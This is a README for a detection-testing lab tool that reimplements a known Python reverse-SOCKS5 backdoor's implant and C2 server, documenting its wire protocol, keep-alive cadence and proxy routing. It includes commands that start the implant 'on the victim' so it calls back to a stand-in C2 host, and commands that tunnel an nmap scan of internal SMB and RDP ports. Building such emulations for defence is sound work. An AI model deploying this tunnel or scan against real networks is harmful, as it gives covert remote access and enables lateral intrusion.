# vipertunnel

A reverse SOCKS5 tunnel, reimplemented **faithfully on the wire** and
deliberately nowhere else, so that a network-side detection can be measured
against this family's traffic.

- `client/` — the implant half, and `start-client.sh`
- `server/` — the counterpart the family never published, and `start-server.sh`

Both are Python 3, standard library only, no install step.

## Why this exists, and what it is not

The original is the Python reverse-SOCKS backdoor InfoGuard Labs documented
in *Slithering Through the Noise* (2026-04-09). Only its **client** was ever
published; the server side was not. So the server here is written to a
derivation of the client's bytes rather than to a sample, and where the two
disagree the client is right — it is the artefact that was observed.

**This reproduces the wire and nothing else.** None of the published class
names, credentials or typos are here, because the published YARA rules key
on exactly those, and a file that trips a file-based rule gets quarantined by
the very endpoints it is supposed to run on. This is a network-layer
exercise; if you want to validate YARA too, that is a different artefact and
a different decision.

## The wire, in one table

SOCKS5 with pieces removed. Not a variant of RFC 1928 — a dialect that
confuses anything expecting the real thing.

| Step | Bytes | How it differs from RFC 1928 |
|---|---|---|
| Command channel | server → client `uint16` **little-endian** port; `0` is a keep-alive, answered with a `0` | not in the RFC at all |
| Greeting | `nmethods \| methods` | **no version byte** |
| Method select | one byte: `0` none, `2` user/pass, `255` unacceptable | — |
| Auth | `ulen \| plen \| uname \| passwd` | RFC 1929 interleaves them as `VER ULEN UNAME PLEN PASSWD` |
| Auth reply | `1` ok, `0` fail | **inverted** |
| Request | `cmd \| atyp \| addrlen \| addr \| port(2, LE)` | no version, no RSV, `addrlen` present even for IPv4 where it is ignored, port **little-endian** |
| Reply | `status(1)`, then `atyp(1)=1 \| addrlen(1)=4 \| addr(4) \| port(2, LE)` | `1` = success |
| Then | raw bidirectional relay | — |

No BIND, no UDP ASSOCIATE, no IPv6 — all three refused, as in the original.

Two structural properties follow, and both are reproduced rather than fixed:

- **A relay connection carries no identity.** The client simply dials the
  port it was told, so the server opens one listener per pending session and
  pairs by port. That is why a scan of a real C2 of this family shows a
  spread of five-digit ports — and why whoever reached the port first could
  take the session.
- **The command port answers a bare probe with `00 00`.** That is the
  keep-alive leaking to anyone who connects, and it is the fingerprint by
  which researchers enumerated this infrastructure across hosting providers.
  Removing it would mean measuring something that is not this family.

## The measurement

### The knob, and why its effect is a step

`TIMEOUT_FOR_SOCKET_OPERATION` is 120 seconds in the original, and it applies
to the command connection's two-byte read. So the server's keep-alive
interval decides the shape of everything a proxy log records:

| `KEEPALIVE` | What the client does | What a proxy log shows |
|---|---|---|
| below 120 s | holds one TCP connection open | one CONNECT, one byte count, **no cadence** |
| `0`, or above 120 s | read deadline expires, reconnects | **a new connection every ~120 s** |

**The server cannot pick any other cadence.** If it closes a command
connection, the original client does not reconnect: it reads zero bytes,
`struct.unpack` raises, and the process exits. Only a *timeout* restarts it.
A cadence other than ~120 s therefore has to come from the client's
`--timeout`, which this exposes and labels a deviation — the client prints a
warning when it is not 120.

Measured here with `--timeout 5` to keep a test short: four connections in
eighteen seconds, each from a different local port, three timeouts, and the
server reaping each one after five seconds. That is the shape, scaled down.

### The proxy is not optional

The original dials its C2 directly and cannot cross a proxy. `--proxy` is
added here, and for this measurement it is **required rather than optional**:
a detection that reads proxy logs sees nothing at all from a host with direct
egress. The proxy leg is transport only — the bytes inside the tunnel are
unchanged, which is what keeps this faithful where the measurement cares.

Where a host reaches an authenticating corporate proxy through a local relay,
that relay is the address to give rather than the proxy itself:

```
PROXY=127.0.0.1:3128 ./client/start-client.sh c2.example.com
```

### What to expect of a periodicity detection

Worth settling before the run rather than after, because "nothing fired" is a
result and not a failed experiment:

- With a keep-alive **under** 120 s there is one long-lived CONNECT and no
  periodicity. A detection that bins per-connection events has nothing to
  work with. This is the far end of a spectrum worth knowing about: at the
  same nominal check-in rate, an agent that pools one socket produces a
  single long session while one that opens a connection per message produces
  thousands of short ones — and this tunnel is the extreme of the first kind.
- With a keep-alive of **0** there is a reconnect every ~120 s with
  near-zero jitter. That is about as easy a target as a periodicity
  detection ever gets, and if it does not fire the finding is about the
  detection rather than about the tunnel.
- The relay connections are driven by your hand on the SOCKS port. They are
  bursty, not periodic, and they are the part that carries volume.

So run both shapes. The pair is the result; either alone is an anecdote.

### Ground truth

Both halves write a ledger — one line per connection, keep-alive, relay and
session, ISO-8601 UTC:

```
server/server-ledger.log
client/client-ledger.log
```

Compare a detection's report against **those**, not against its own
timestamps. A field named for a sleep interval or a jitter does not reliably
hold one: a "jitter" can turn out to be the largest gap between contacts, and
an "average sleep" a span divided by a count. A ledger is how you notice.

## Running it

Two terminals.

```
# the server, on the host the implant can reach
sudo -E ./server/start-server.sh                 # KEEPALIVE=0 by default: cadence
KEEPALIVE=60 sudo -E ./server/start-server.sh     # one held connection instead

# the implant, on the victim
PROXY=127.0.0.1:3128 ./client/start-client.sh c2.example.com
```

Then drive traffic through the operator port, which speaks real RFC 1928:

```
curl --socks5 127.0.0.1:1080 http://10.0.0.5/
proxychains -q nmap -sT -Pn -p 445,3389 10.0.0.0/24
```

`PORT=443` is the default and worth keeping: the proxy allowlist you are
measuring through may permit `CONNECT` to 443 and nothing else, in which case
a different port measures the proxy instead of the tunnel. It needs root, or
pick a higher port knowing what you traded.

`--socks-user` / `--socks-password` put RFC 1929 credentials on the operator
port. Loopback keeps other hosts out; it does nothing about other local users
on the same box.

## Authorisation

This is adversary emulation for a detection measurement in a lab you own.
Running it anywhere else is somebody else's intrusion.
